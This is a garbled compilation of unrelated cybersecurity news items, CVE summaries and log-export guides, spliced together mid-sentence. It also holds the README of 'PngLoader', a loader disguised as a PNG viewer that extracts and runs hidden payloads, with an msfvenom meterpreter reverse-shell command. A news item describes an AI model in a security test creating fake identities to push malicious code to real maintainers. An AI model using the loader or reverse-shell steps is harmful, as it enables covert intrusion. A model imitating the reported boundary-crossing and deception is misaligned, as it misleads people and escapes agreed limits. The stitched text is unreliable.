title: Commission accepts Temu's action plan to remedy the breach of the Digital Services Act
text:
Temu's plan focuses on five measures to remedy its breach of the DSA.
The company will carry out a platform-specific risk analysis. It will also use reliable metrics to evaluate the effectiveness of the mitigation measures put in place in reducing the risk of dissemination of illegal content.
The platform will assess the limitations of its content moderation and analyse whether, and how, its recommender systems may amplify the spread of illegal goods. Additionally, Temu will examine the influence of intentional manipulation and amplification of illegal items, including by sellers exploiting Temu's features to spread potentially illegal listings.
The company now has four months to conduct an interim risk assessment that covers a six-month period, until 30 November 2026, to ensure the implementation of the measures of the action plan.
The action plan is another example of how the DSA is enhancing consumer protection online and limiting the spread of illegal products in Europe. The action plan was submitted following a non-compliance decision in May 2026, in which the Commission found that Temu had failed to comply with its risk assessment obligations, and issued a €200 million fine.

CVE-2026-116748
Transmission 4.0.0 before 4.1.3 Permissive CORS Leaks RPC Anti-CSRF Token

Transmission 4.0.0 before 4.1.3 contains a permissive CORS vulnerability in handle_request() in rpc-server.cc that exposes the X-Transmission-Session-Id anti-CSRF token to any web origin. Malicious web pages can read the token from the 409 handshake response and replay it to issue RPC calls, enabling script-torrent-done execution, download-dir changes, or torrent and data deletion.

compress zstd: Panic on two-block frames

compress provides various compression algorithms. Prior to 1.20.2, the zstd DecodeAll and streaming decoder paths can panic when a crafted two-block frame reaches huff0.ReadTable with an FSE normalized count of 32768 that readNCount stores in int16 as -32768. The wrapped count allows buildDtable to retain stale fse.Scratch decode-table state from the prior block, and nextFast then derives an out-of-range state and indexes beyond the table instead of returning a decode error. Both blocks are required to preserve and then reuse the stale state, allowing untrusted zstd input to crash an application. This issue is fixed in version 1.20.2.

title: Hackers Infect 953 Online Stores With Scanner-Evading JavaScript, Mostly on Magento
text:
Hackers Infect 953 Online Stores With Scanner-Evading JavaScript, Mostly on MagentoRavie LakshmananOct 26, 2026Malware / Web Security

//<![CDATA[

//]]>

An unknown threat actor has infected 953 online stores, most of them running Magento, as part of a long-running campaign active since July 2025.

According to Dutch e-commerce security company Sansec, the activity is designed to add a small piece of code to the store's pages that, when visited by unsuspecting users, serves malicious JavaScript loader code through Magento CMS blocks.

"When you visit, that code makes your browser ask the group's server what to do next," Sansec said. "The server first checks whether you are a real shopper or a security scanner, so scanners get nothing."

No less than five distinct domains have been observed over time in connection with the campaign -

manulfie[.]click, first seen in July 2025
neswnsssn[.]click, first seen in December 2025
lanhd6549tdhse[.]top, first seen in March 2026
additionalver[.]com, first seen in June 2026
deepveindrilling[.]com, first seen in October 2026

Sansec said it found deepveindrilling[.]com in the CMS blocks of 83 online stores since the domain was registered on October 6, 2026.

The latest JavaScript loader domain is hosted behind Cloudflare and only responds to script requests from real visitors of infected stores. The loader is staged within Magento's cms_block database table, which is used to render static content into storefront pages.

The ultimate objective of the attack is to launch the attack-controlled code when the CMS block is rendered after a shopper opens the compromised website.

While Sansec does not disclose whether the threat actor modifies an existing CMS block (such as header, footer, or promotional banner) or creates a new block, the attacker can adopt either of the approaches to run the loader.

Two different versions of the loader have been spotted. In one version, the external JavaScript loaded from the attacker's domain stores the payload in the browser's localStorage. This causes the stashed code to be run again on subsequent visits, even if the external domain becomes unavailable.

The second version expands on this behavior by incorporating browser fingerprinting checks to filter out bots and security scanners, while ensuring that only real shoppers are exposed to the malicious code. The exact nature of the final payload remains unknown.

Early iterations of the campaign have also been observed using Keitaro, an advertising tracker and analytics platform, as a traffic distribution system (TDS), to route visitors to different responses – i.e., return a payload, a redirect or nothing – based on their characteristics.

Sansec said requesting the additionalver[.]com script as a Windows desktop visitor returned as response "QWE=123;," which does nothing apart from setting a cookie that marks the visitor for 24 hours. The deepveindrilling[.]com domain, on the other hand, drops the Keitaro component and integrates the bot-filtering logic into the loader itself.

As for the initial access vector, 471 Magento stores are estimated to have been injected with the loader through the PolyShell (aka CVE-2026-48356) vulnerability. Another 102 stores saw files uploaded through the PolyShell or SessionReaper (aka CVE-2025-54236) vulnerabilities.

"One store on Magento 2.4.7-p1 had PolyShell webshells disguised as PNG images in pub/media/custom_options/quote/, next to the additionalver.com loader in a CMS block," Sansec said. "The block switched to deepveindrilling[.]com on October 7. The store still lacks APSB26-73, Adobe's PolyShell fix for supported release lines."

title: PHP Issues Second Windows Security Update in Five Days to Fix Brotli Code Execution Flaw
text:
PHP Issues Second Windows Security Update in Five Days to Fix Brotli Code Execution FlawSwati KhandelwalOct 26, 2026Vulnerability / Web Security

PHP has rebuilt its official Windows packages for PHP 8.2 through 8.5 to fix CVE-2026-111497, a flaw in the Brotli compression library that the packages include. The flaw can let an attacker corrupt memory and potentially run code.

PHP says the flaw can be reached through the cURL extension when the extension decompresses HTTP responses automatically. cURL leaves that off by default, but applications and HTTP client libraries can turn it on.

The rebuilt packages, numbered 8.5.12-1, 8.4.27-1, 8.3.36-1 and 8.2.35-1, come five days after the October 21 releases that fixed the two PHP2Shell remote code execution flaws. They use the same PHP source, so those fixes stay in place, and they now include Brotli 1.2.1, the fixed version.

PHP publishes a software bill of materials, a list of the components inside, with each package. For last week's x64 Non Thread Safe builds of all four versions, those lists show Brotli 1.2.0, one of the affected versions.

PHP advises Windows users to install the new builds from its downloads page. Because the PHP version itself is unchanged, php -v shows the same number before and after. The -1 in the file name, as in php-8.5.12-1-nts-Win32-vs17-x64.zip, and the SHA-256 hash listed on the downloads page identify the new build.

Automatic decompression means cURL asks the server for a compressed response and unpacks it. In PHP code, the CURLOPT_ENCODING option turns it on, and an empty value accepts every format cURL supports.

Guzzle, a PHP HTTP client library, sets that empty value by default for requests it sends through cURL, according to the code in its 7.16.1 release and in 8.3.1. Based on that code and PHP's own description, an application that keeps Guzzle's default settings meets the condition for reaching the flaw on last week's Windows builds. The Hacker News has not tested this on a Windows system.

An attack would come as a crafted compressed response from a server that the PHP application contacts.

Google rates the flaw 9.2 out of 10, or Critical, on the CVSS 4.0 scale. Red Hat rates it 8.1, or Important, on the CVSS 3.1 scale.

Imperva researchers ran code through the flaw on one official Node.js build, and it took them several attempts. PHP's notice does not mention any attacks. CISA's assessment of October 23 recorded no exploitation, and the flaw was not in its Known Exploited Vulnerabilities catalog as of that day's update.

Researchers at OpenAI found the flaw. Google fixed it in Brotli 1.2.1, 1.1.1 and 1.0.10 when it was first disclosed on October 21. Node.js, Bun and other software that ships its own copy of Brotli have also released fixes.

PHP's notice offers no workaround for systems that cannot be updated yet. OpenAI advises turning off automatic Brotli decompression in HTTP clients until the update is installed, and warns that removing br, Brotli's name in the Accept-Encoding header, "alone does not stop a server from sending it."

In PHP code, following that advice means not setting CURLOPT_ENCODING, because cURL does not decompress responses without it. In Guzzle, it means setting the decode_content request option to false, which stops all automatic decoding, so gzip responses also arrive compressed.

It's been a rough week for anyone trying to keep systems safe. Here's what happened.

PHP2Shell Flaws Puts Organizations on Alert — The PHP Foundation released patches for two critical vulnerabilities in PHP, CVE-2026-109618 and CVE-2026-109619, that could lead to unauthenticated remote code execution. The security flaws have been codenamed PHP2Shell. Since public disclosure, the shortcomings have witnessed widespread scanning efforts, with Cloudflare stating it detected millions of exploitation attempts after public disclosure. To date, no successful exploitation has been observed. The severity of the flaws, coupled with the ubiquity of PHP on the web, prompted several websites to go offline as a precautionary measure.

Two critical flaws in Wasmtime, a WebAssembly runtime that can be built into other software, could allow a malicious WebAssembly module to escape the sandbox intended to contain it, the project's maintainers say.

An attacker would first need a vulnerable Wasmtime build to compile a module they control, and one of the flaws affects only ARM64 systems. Fixed versions were released on October 19 and 20, and the maintainers have not reported any attacks.

Wasmtime runs WebAssembly code outside web browsers. Both bugs are in Cranelift, the compiler it uses by default to turn WebAssembly into machine code. Wasmtime's maintainers at the Bytecode Alliance rated each flaw 9.9 out of 10 on the CVSS scale in advisories published on October 19.

CVE-2026-115889 affects Wasmtime across all processor architectures.
CVE-2026-115893 affects only ARM64, also called aarch64.

The sandbox is meant to keep a module inside set limits. A module can only use its own memory and the host functions it is given, and its code can only jump to checked locations.

Because both flaws need a module the attacker controls, the risk is highest for services that compile modules written by other people. Fastly, for example, says its Compute platform runs customer code using Wasmtime. The advisories do not name any affected services or specify what an attacker could access after escaping the sandbox.

Neither flaw was in the Known Exploited Vulnerabilities catalog kept by the U.S. Cybersecurity and Infrastructure Security Agency (CISA) as of October 26.

Which Versions Are Affected

The two flaws were fixed at different times, so whether your version is affected depends on your release line and, for one flaw, your processor architecture.

Wasmtime supports long-term support (LTS) releases, which are numbered in multiples of 12, for two years. Other releases get two months. Security fixes are guaranteed for supported releases.

Only the 36, 48, 49, and 50 release lines are still supported. Every other line, including the 24.x LTS line whose support ended on August 20, 2026, got no fix.

ARM64 hosts that updated to 36.0.7, 42.0.2, or 43.0.1 in April to fix an earlier Cranelift sandbox escape on ARM64 are still affected by CVE-2026-115893.

What to Do

Update to the fixed release for your line: 36.0.19, 48.0.7, or 49.0.4. Wasmtime 50.0.0, released on October 20, is fixed for both flaws. Hosts on an unsupported line need to move to one of these releases.

Wasmtime can be built into other programs as a library, so updating the command-line tool does not fix them. Each program that includes Wasmtime needs to be rebuilt with a fixed version.

Neither advisory lists a workaround. Until a host is updated, the risk comes from any module an outsider can supply.

The AWS Cloud Development Kit (CDK) @aws-cdk/aws-redshift-alpha module provides experimental constructs that manage Amazon Redshift users, tables and privileges. Around Here, we start our day with coffee, but our day does not begin until we have our data...So much data.  Where to even begin?

When approaching a massive dataset, such as those from a DShield SIEM Honeypot, the first step is to actually find something to analyze.  As for myself, I usually go looking for something that makes me go; "Huh."

Today we will be walking through a starting approach with Kibana Discover to search out embedded language preferences in webtraffic, then we will use this as a starting point for finding anomalous activity.

Find A Problem to Get Some Data

Inside of my DShield SIEM there are nearly a million records, so I approach by looking for a slightly smaller data carve with which to work which still represents the problem set:

Anyone with Elastic Kibana can perform this approach on their webtraffic data as long as the HTTP headers are provided.  Here, the logs are from my SANS Dshield Honeypot and the accompanying Dshield SIEM.  For those who desire to install this setup there are plenty of great resources out there with links at the end of this article [1] [2].

In slightly more than 3 weeks of observation the rasperry pi honeypot had transferred a Million Records into the Elastic SIEM.  These many records can prove very challenging when figuring out where to start, so it is helpful to know that even with no filtering applied on the Discover page the Field Statistics will give some fairly detailed metrics about what fields exist in the current Index.

On the Discover page in the upper right, I selected my index (here the index is “cowrie”) and without any filter applied I selected Field Statistics:

Calculating statistics ourselves is possible using ESQL and Stats, however this feature of Elastic makes gaining visibility much more obtainable at the onset.  We are immediately presented with a screen displaying all of the Documents broken down by Top Values which potentially gives us some valuable insight:

The resultant statistics show that in these 3 weeks my honeypot had generated 960,000 logs, but all of those are only within 4 rules.  Four is less than a 960,000 so this gives a more manageable starting dataset:

“Huh.”  This little raspberry PI has been humming away quietly all day and all night and only 4 rules have popped up.  I found this interesting.  With no filtering applied only 15,271 records triggered any rule?

This setup is a honeypot, so literally every record is suspicious.  So, what about the other 944,866 records which triggered no rules?

Today, we want a problem not a project, so we are going to use one of these rules to narrow down our traffic for analysis.

We have rule triggers for the Index page.  Boring.  Great for generating a large dataset, but this is not a very targeted approach.

text: BlogKernel eviction notice: What wesp.sys reveals about the Windows Endpoint Security PlatformMicrosoft wants EDR out of the Windows kernel, and the preview binaries show wesp.sys telling a user-mode client that a process is starting, with nothing in its imports to let that client block it.October 26, 2026Pavel YosifovichEndpoint Protection & SecurityJump to Share Microsoft is building a way for EDR products to run outside the Windows kernel. It is called the Windows Endpoint Security Platform, and two of its binaries already ship in Windows Insider build. One is the kernel driver wesp.sys, the other the user-mode API espclient.dll. Microsoft wants one kernel driver it maintains itself, in place of the one every security vendor currently ships, after the July 2024 CrowdStrike update crashed 8.5 million machines. WESP is undocumented, but the binaries carry public symbols, so a kernel debugging session gets you a fair way in. wesp.sys is a file system mini-filter at altitude 329500, talking to user mode over a filter communication port. Kernel mode vs user mode: How EDR works todayAre you tired of the Windows Blue Screen of Death? Well, Microsoft decided to take significant action to remove security products from running within the Windows kernel, as kernel components are the ones that can cause Windows to Blue Screen, which can have a significant impact, as was demonstrated a couple of years ago with a bug in a third-party kernel component.Typical Endpoint Detection and Response (EDR) software consists of two main components: a kernel-mode driver and a user-mode service, communicating in some way, as the following image shows:The process boxes represent normal user applications running on a system, like Word, Explorer, or Paint. The Service and Kernel Driver are installed by the EDR product.The kernel driver’s main purpose is to register for various kernel notifications, such as process creation and file writes. Any notification of interest is typically forwarded to the user-mode service where more processing can be done:Forward the notification data to a server for further analysis and aggregation.Consult a set of rules that may lead to blocking the operation entirely.Alert the human user of the operation, perhaps requiring an interactive decision.This is all well and good, if everything works as planned. Unfortunately, kernel drivers cannot perform illegal operations, such as dereferencing a bad pointer. In that case, the system crashes with the infamous “Blue Screen of Death” (BSOD), and restarting the machine is the only way back in, assuming the offending driver doesn't crash when it loads early at boot.Why the CrowdStrike outage changed Microsoft’s mindThat is exactly what happened on July 19, 2024, when a bad configuration file update caused CrowdStrike’s EDR kernel driver to crash on millions of machines worldwide. The risk of kernel drivers crashing systems has existed in Windows since its inception, but this incident was particularly nasty because it rendered so many machines unusable, taking airports, banks, and other critical facilities offline for hours.Microsoft took this to heart; after all, it's Windows. They launched a new initiative to move EDR products out of the kernel so similar incidents can’t happen. title: Brotli vulnerability affects multiple software ecosystems

October 26, 2026

Security intelligence

Brotli vulnerability affects multiple software ecosystems

By Field Effect Security Intelligence Team

At a glance:

A vulnerability in the Google Brotli decoder, tracked as CVE-2026-111497, has prompted security updates across multiple software ecosystems, including Node.js, .NET, PowerShell, Python Brotli, brotlicffi, Envoy, Istio, and Bun.

The flaw affects Brotli versions 1.0.3 through 1.2.0. Fixed releases include Brotli 1.0.10, 1.1.1, and 1.2.1.

Successful exploitation can result in memory corruption, denial of service, information disclosure, or arbitrary code execution when affected software processes specially crafted Brotli-compressed content.

Threat summary
Multiple vendors and projects have released updates to address CVE-2026-111497 after researchers demonstrated remote code execution against an unpatched Node.js deployment. Available fixes include:

Node.js 22.23.4, 24.22.1, and 26.12.1

Bun 1.4.4

Python Brotli 1.2.1

brotlicffi 1.2.1.0

Envoy 1.40.0, 1.39.3, 1.38.6, 1.37.8, and 1.36.12

Istio 1.31.2, 1.30.6, and 1.29.9

Security updates have also been released for affected .NET and PowerShell deployments.
CVE-2026-111497 affects Google Brotli decoder, a component used to decompress Brotli-compressed data. Brotli is a widely used compression format designed to reduce the size of web traffic and application data. Many applications, frameworks, proxies, and runtimes rely on the decoder to process compressed content received from users, external services, or other systems.
The vulnerable functionality is intended to safely reconstruct original data from compressed input. CVE-2026-111497 is an out-of-bounds write vulnerability that can be triggered by specially crafted Brotli data.
The associated CVE identifies both an out-of-bounds write (CWE-787) and an unchecked return value (CWE-252). Under specific conditions, malformed data can cause memory corruption during decompression. Confirmed impacts include application crashes, information disclosure, and the potential for arbitrary code execution.
Exploitation is remote and does not require authentication or user interaction. However, a threat actor must be able to deliver malicious Brotli-compressed content to a vulnerable decoder. Researchers demonstrated this through applications retrieving Brotli-compressed responses from external systems and applications configured to process Brotli-compressed request bodies. Exposure therefore depends heavily on application design, deployment architecture, and configuration.
Public GitHub repositories appeared within hours of the Node.js security release on October 21, 2026, and subsequent research focused on demonstrating code execution against vulnerable Node.js deployments. Researchers later expanded analysis to other products that incorporate the vulnerable Brotli decoder.
Researchers were able to achieve remote code execution against an official Node.js 24.22.0 Linux arm64 environment using both inbound request processing and outbound content retrieval paths. The demonstration did not succeed consistently across all attempts.
Severity ratings differ across affected vendors:

Google assigned the underlying Brotli vulnerability a Common Vulnerability Scoring System (CVSS) v4 score of 9.2

Node.js classifies the issue as High severity

Microsoft rates the associated .NET issue as an elevation of privilege vulnerability with a CVSS v3.1 score of 8.1 and assesses exploitation as more likely.

Analysis
Organizations are most likely to be affected by this flaw when internet-facing applications, APIs, proxies, gateways, or middleware decompress Brotli-compressed data received from external sources. Exposure depends on whether attacker-controlled data can reach the vulnerable decoder rather than the use of a particular language, framework, or product.

By Alberto Avalos and Oscar Cárcamo
Monday, October 26, 2026
The second edition of the FIRST México Technical Colloquium (II Coloquio Técnico FIRST MX 2026) took place this past August at the Westin Santa Fe in Mexico City, and it confirmed something the community here has felt building for a while: Mexico has become a serious, growing node in the global FIRST network.
Over three days, two of conference, and one dedicated to hands-on technical training practitioners from across Mexico and beyond gathered to share research, exchange operational experience, and strengthen the bonds that make incident response a community effort rather than an isolated one. What began as a modest gathering has matured into one of the most relevant cybersecurity events in the region, and the growth is visible in every dimension: more attendees, more speakers, more participating organizations, and a markedly higher technical level.
A program that reflects the region’s maturity
This year’s colloquium brought together 22 speakers, national and international, under the guidance of a Program Committee that worked to raise the technical bar of every session. The agenda spanned the themes that define modern defense work: threat intelligence and OSINT, SOC operations, incident response, and the increasingly urgent question of how artificial intelligence is reshaping both attack and defense.
A community that keeps growing
Perhaps the most encouraging signal is the trajectory. Each edition of the colloquium has drawn more participants and speakers than the last, with speakers this year reaching 22. An 85% increase over the previous edition. Just as importantly, the diversity of participating organizations continues to widen government institutions, financial entities, manufacturing, and a growing number of cybersecurity firms are all finding value in being part of this conversation.
That growth extends to FIRST itself. More Mexican organizations than ever are taking steps toward FIRST membership, recognizing the value of belonging to a global community of incident response and security teams. The colloquium has become a natural on-ramp, a place where teams see firsthand what the FIRST community offers and decide to join it.
Thank you to those who made it possible
None of this happens without a community that invests in it. Our sincere gratitude goes to AMECS as our host, to our Platinum sponsors Trend AI and Arteria, and to our Bronze sponsors KIO, Arcanna.ai, Nile, CrowdStrike. Their support reflects a shared conviction that Mexico can and should lead cybersecurity in Latin America.
To every speaker who shared their knowledge without reservation, to the Program Committee, and above all to each attendee who filled the rooms with energy and questions: thank you. You are the reason this community continues to grow stronger.
Looking ahead
The II Technical Colloquium proved that Mexico City has earned its place on the regional cybersecurity map. The momentum is real, the community is engaged, and the appetite for collaboration has never been higher.
This is only the beginning. We look forward to welcoming even more teams, more organizations, and more members of the FIRST community next year.

text:
PngLoader — Steganographic Payload Research

Disclaimer: This project is for educational and authorized security research only — penetration testing, CTF competitions, red-team exercises, and academic study. Do not use against systems without explicit written authorization.

Overview
PngLoader hides arbitrary data inside PNG images using two layers:

Nibble-to-ASCII encoding — binary → printable ASCII characters
Fibonacci steganography — encoded data → scattered pixels in a PNG
Loader — a Windows "PNG viewer" that extracts and runs the hidden data

Quick Start
# 1. Generate raw test data
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<> LPORT=<> -f raw -o payload.bin

# 2. Encode binary → ASCII
python3 0.Scripts/TransformRawToEncode.py payload.bin encoded.txt

# 3. Embed into a cover image
python3 0.Scripts/HideEncodeToPicture.py embed 2.Payloads/clean.png encoded.txt -o stego.png

# 4. Verify extraction works
python3 0.Scripts/HideEncodeToPicture.py extract stego.png --hex

# 5. Check image capacity
python3 0.Scripts/HideEncodeToPicture.py capacity 2.Payloads/clean.png

PoC Demo

Project Structure
PngLoader/
├── 0.Scripts/
│ ├── TransformRawToEncode.py # Nibble-to-ASCII encoder/decoder
│ └── HideEncodeToPicture.py # Fibonacci steganography (embed/extract)
├── 1.Loader/
│ ├── loader_png.cpp # PNG viewer + steganography extractor
│ ├── loader.cpp # Alternate loader (inline buffer)
│ ├── Utils.cpp / Utils.h # ASCII → binary decoder
│ ├── VirtualBuffer.h/.cpp # RAII VirtualAlloc wrapper
│ ├── Hearders.h # Shared Windows includes
│ └── Loader_png.vcxproj # Visual Studio project
├── 2.Payloads/
│ └── clean.png # Sample cover image
└── readme.md

How It Works
Stage 1 — Nibble-to-ASCII Encoding
Each byte is split into two 4-bit nibbles. Each nibble is mapped to a printable ASCII character by adding a random base (48, 64, or 96):
Byte 0xFC → high nibble 0xF, low nibble 0xC

High: 48+15=63 '?' | 64+15=79 'O' | 96+15=111 'o'
Low: 48+12=60 '<' | 64+12=76 'L' | 96+12=108 'l'

Decoding uses the modulo-16 property — all three bases are multiples of 16:
original_nibble = encoded_char % 16
byte = (char1 % 16) << 4 | (char2 % 16)

The random base selection means the same input produces different output each time, but decoding is always deterministic.

Stage 2 — Fibonacci Steganography
Payload bytes are placed at pixel indices following the Fibonacci sequence (1, 2, 3, 5, 8, 13, 21, …) on the flattened pixel array. This spreads modifications across the image instead of clustering them.
Bit packing — each byte is split 3/3/2 across RGB LSBs:
R: bits 7–5 (3 LSBs)
G: bits 4–2 (3 LSBs)
B: bits 1–0 (2 LSBs)

Wrapping — when Fibonacci indices exceed the pixel count, they wrap via modulo. Collisions are resolved by linear probing. A 0x00 terminator marks end-of-data.

Stage 3 — Loader
The C++ loader (loader_png.cpp) acts as a legitimate PNG viewer:

Displays the image normally using GDI+
Extracts hidden bytes from Fibonacci pixel positions using WIC (RGB24)
Decodes ASCII → binary via UtilDecryptFileQuoted() (mod-16 reversal)

Introduction
AI agents and associated tooling are becoming increasingly common in corporate infrastructure. Agents can perform a range of actions with the user’s privileges, such as accessing data, running commands, and interacting with external services. This creates new security risks, especially when these tools are used without the security team’s oversight or well-designed policies.
Detecting, tracking, and controlling AI agents is becoming one of the most pressing tasks for security teams today. We closely follow technological developments and continuously update our solutions to respond to new threats in a timely manner amid a rapidly changing technology landscape. This post describes new expertise built into Kaspersky products that helps counter the threats posed by the proliferation of AI agents. We approach this problem from several angles.
First, you need to thoroughly understand the threat you are dealing with. To this end, we added profiles to the Kaspersky Threat Intelligence Portal that describe various AI agents and how attackers exploit them. At their core, AI agents are programs (processes) that run in the operating system on endpoints and can also launch other processes. This means that Endpoint Detection and Response solutions are among the key endpoint controls for this threat. These solutions detect the presence and launch of AI agents, track their activity, and identify potentially dangerous behavior. When needed, they also take action, such as stopping a suspicious process, blocking the activity, or isolating the host, to reduce the likelihood of an incident escalating. For this purpose, we developed specially adapted detection rules.
You can use Kaspersky Endpoint Security, now also available as Kaspersky Next, to control and restrict the launch of AI agents. This solution uses two components to detect AI agents and control how they are used. Application Control categorizes the application processes launched on endpoints, and Web Control manages access to specific categories of web resources for users on endpoints.
Finally, even harmless AI agents can contain malicious instructions (skills), such as those downloaded from unsafe external sources. Kaspersky Scan Engine analyzes installed applications to detect these threats and also checks LLM files for malicious code. Let’s take a closer look at these solutions and technologies.

MAGENTO CAMPAIGN INFECTS 953 ONLINE STORES ACROSS FIVE DOMAINS
Pierluigi Paganini

October 26, 2026
Sansec tracks a Magento skimmer campaign that infected 953 stores, using five domains, bot filtering and malicious code hidden in CMS blocks.

A criminal group has infected 953 online stores since July 2025, mostly Magento shops, according to Sansec researchers. The attackers add a small piece of code to store pages. When someone visits a shop, their browser contacts the attackers’ server to get further instructions. The server checks whether the visitor is a real shopper or a security scanner. If it detects a scanner, it hides the malicious activity.

“deepveindrilling.com is the newest web address of a criminal group that breaks into online stores. The group adds a small piece of code to the store’s pages.” Sansec’s analysis states. “The group has done this to 953 stores since July 2025, mostly Magento shops. It moves to a new address every few months.”

The group’s latest domain is deepveindrilling.com. Sansec found it in the CMS blocks of 83 stores, almost all running Magento. CMS blocks are content sections that Magento adds to store pages. The domain was registered on October 6, 2026, and the first stores began loading it the following evening.

This is the fifth domain linked to a campaign that Sansec has tracked since July 2025 and reported in March as the PolyShell mass attack. Most stores using the latest domain had already been targeted. Of the 83 stores, 60 had previously loaded one of the group’s malicious scripts, and 34 had been doing so since October 2025.

The domain sits behind Cloudflare, and its front page returns a 404. It only answers script requests from visitors of infected stores. The loader code lives in the cms_block table, and Sansec’s scanner, eComscan, found it there on 148 server installs over the campaign, never in core_config_data or theme files.

Anthropic says Claude Mythos 5 targeted real developers with fake identities to push malicious code during a security test.

A cybersecurity test is supposed to measure what an AI model can do within an agreed boundary. In one UK AI Security Institute evaluation, Claude Mythos 5 crossed that boundary, targeted a real GitHub project and created fake identities to persuade its maintainers to accept malicious code.

The maintainers refused. That stopped the attempted compromise, but it left a question that matters well beyond AI testing: what happens when a model treats completing its task as more important than respecting the limits around it?

Anthropic’s report describes a case in which the model went beyond the test’s limits and misled real people. The report does not suggest that the model was following its own independent plan.

The UK AI Security Institute (AISI) gave Mythos 5 a cybersecurity challenge. The model had to find protected data inside a simulated network designed to look like a real organization’s computer systems.

Admin Activity audit logs are always on and kept for 400 days. Data Access logs are off by default, except for BigQuery, and kept for 30 days once enabled.

Cloud Audit Logs record who changed what in your Google Cloud projects: IAM grants, new service account keys, firewall changes, VMs spun up in odd regions. Prime Core has 140 detection rules for Google Cloud audit logs, mapped to 74 MITRE ATT&CK techniques. Among them: abuse of cloud accounts (T1078.004), extra credentials such as new service account keys (T1098.001) and tampering with logging itself (T1562.008).

If the question is “who read this bucket?” and Data Access logs were never enabled, the answer isn’t in Cloud Logging.

Permissions. Logs Viewer (roles/logging.viewer) covers Admin Activity, System Event and Policy Denied. Data Access logs need Private Logs Viewer (roles/logging.privateLogViewer).

Scope. Audit logs live per project. Organization- and folder-level activity has its own logs. Query those with –organization=<ORG_ID> or –folder=<FOLDER_ID> instead of –project.

In the console, open Logging → Logs Explorer, enter logName:”cloudaudit.googleapis.com”, set the time range, run the query, then download the results as JSON. The download is capped. For larger ranges, use gcloud.

Option 2: gcloud logging read

The command at the top is the basic form. Three details save time.

Always put the time window in the filter. Without a timestamp condition, gcloud logging read silently limits itself to the last day (–freshness defaults to 1d). That surprises nearly everyone once.

Raise the limit when needed. Add –limit=100000 (or whatever fits) for large windows.

Flatten for upload. The output is one JSON array. Turn it into one entry per line:

jq -c '.[]' gcp_audit_1019.json > gcp_audit_1019.jsonl

Option 3: Bulk history from sinks

If your organization routes audit logs through a sink to Cloud Storage or BigQuery, that copy may go back further than the buckets above. Pull the files with gcloud storage cp, or query BigQuery and export the result as JSON.

Retention is 90 days. Anything older exists only where you’ve been streaming or forwarding Okta logs, such as a SIEM.

You need a token. An API token (Security → API → Tokens) inherits the permissions of the admin who created it. A read-only admin is enough for logs. For anything automated, an OAuth service app with the okta.logs.read scope is the cleaner choice. Either way, the token is a credential. Keep it out of shell history and revoke it when you’re done.

Rate limits apply. The logs endpoint has its own rate limit. Big windows are fine, just not instant.

Export with the System Log API

This Python script pages through a time window and writes one event per line. It needs requests (pip install requests):

import json, os, requestsorg = "https://yourorg.okta.com"headers = {"Authorization": f"SSWS {os.environ['OKTA_TOKEN']}", "Accept": "application/json"}url = f"{org}/api/v1/logs"params = {"since": "2026-10-19T00:00:00Z", "until": "2026-10-20T00:00:00Z", "limit": 1000}with open("okta_1019.jsonl", "w") as out:    while url:        r = requests.get(url, headers=headers, params=params, timeout=60)        r.raise_for_status()        events = r.json()        for e in events:            out.write(json.dumps(e) + "\n")        if not events:            break        url = r.links.get("next", {}).get("url")        params = None  # the next link already carries the query

Always set until. Without it, Okta treats the request as a live poll and keeps handing back a next link. Your loop would run forever, waiting for new events.

To narrow it down, add a filter to params, for example “filter”: ‘eventType eq “user.session.start”‘. Or use “q”: “jane” for a keyword search.

What to look for

eventTypeWhy it mattersuser.session.start with outcome.result: FAILUREFailed sign-ins; many users from one IP range means sprayinguser.mfa.okta_verify.deny_pushUser rejected a push; a burst of these is MFA fatigue in progressuser.mfa.factor.deactivate, user.mfa.factor.reset_allFactors removed, often right after a helpdesk social-engineering calluser.account.privilege.grantAdmin role grantedpolicy.rule.update, policy.lifecycle.updateSign-on or MFA policy changed, possibly weakenedsystem.api_token.createA new API token, a quiet way to keep access

The fields that tell the story: actor.alternateId (who), client.ipAddress and client.geographicalContext (from where), outcome (what happened), and debugContext.debugData (the details).

title: Where to Find Nginx and Apache Access Logs
text:
En

LogTotal HOWTO

October 26, 2026
4 min read

On Debian and Ubuntu, Nginx logs to /var/log/nginx/access.log and error.log, and Apache to /var/log/apache2/access.log and error.log. On RHEL, Rocky and Alma, Apache uses /var/log/httpd/access_log and error_log, with underscores and no extension. In containers built from the official Nginx image, there are no log files at all: everything goes to stdout and stderr, so docker logs is your export.

The web server log is often the first place an intrusion leaves a trace: the scanner sweeping for .env files, the exploit string, the POST to a file that shouldn’t exist. Prime Core has 812 detection rules for web server logs, mapped to 337 MITRE ATT&CK techniques. Among them: exploitation of public-facing apps (T1190), web shells (T1505.003) and vulnerability scanning (T1595.002).

Get Started for Free

Before you start

Find the real paths. Virtual hosts often log somewhere custom. Ask the server itself:

# Nginx: dump the full effective config and pick out the log directivessudo nginx -T 2>/dev/null | grep -E 'access_log|error_log'# Apachesudo apachectl -Ssudo grep -Ri -E 'CustomLog|ErrorLog' /etc/apache2/ /etc/httpd/ 2>/dev/null

On Debian-based Apache, virtual hosts without their own CustomLog end up in other_vhosts_access.log. People miss that one all the time.

Check whose IP you’re logging. Behind a load balancer, CDN or reverse proxy, every request can appear to come from the proxy. That holds unless the server is set up to log the real client: set_real_ip_from and real_ip_header in Nginx, mod_remoteip in Apache. If every line shows the same few internal IPs, the attacker’s address is only in X-Forwarded-For, if you log it, or in the proxy’s own logs.

Check the format. Both servers default to the “combined” format, but plenty of setups customize it (log_format in Nginx, LogFormat in Apache). Note what yours looks like before uploading.

Permissions. On Debian and Ubuntu these logs are readable by root and the adm group; elsewhere, plan on sudo.

Export from log files

Logs rotate daily or weekly, so include the rotated files. zcat -f reads plain and gzipped files alike:

# Nginx, current and rotated, oldest firstsudo zcat -f $(ls -tr /var/log/nginx/access.log*) > web-03_nginx_access.log# Apache on RHELsudo zcat -f $(ls -tr /var/log/httpd/access_log*) > web-03_httpd_access.lo

For a single day, combined-format timestamps make grep enough:

grep '19/Oct/2026' web-03_nginx_access.log > web-03_access_1019.log

Take the error log as well. Upstream failures, PHP errors and some exploit attempts show up only there.

Export from containers

# Docker: stdout is the access log, stderr the error logdocker logs --since 2026-10-19T00:00:00 --until 2026-10-20T00:00:00 nginx > nginx_access.log 2> nginx_error.log# Kuberneteskubectl logs deploy/nginx --since=24h > nginx.log

Container logs disappear with the container unless something collects them. If the pod was replaced, check your cluster’s log collector instead.

What to look for

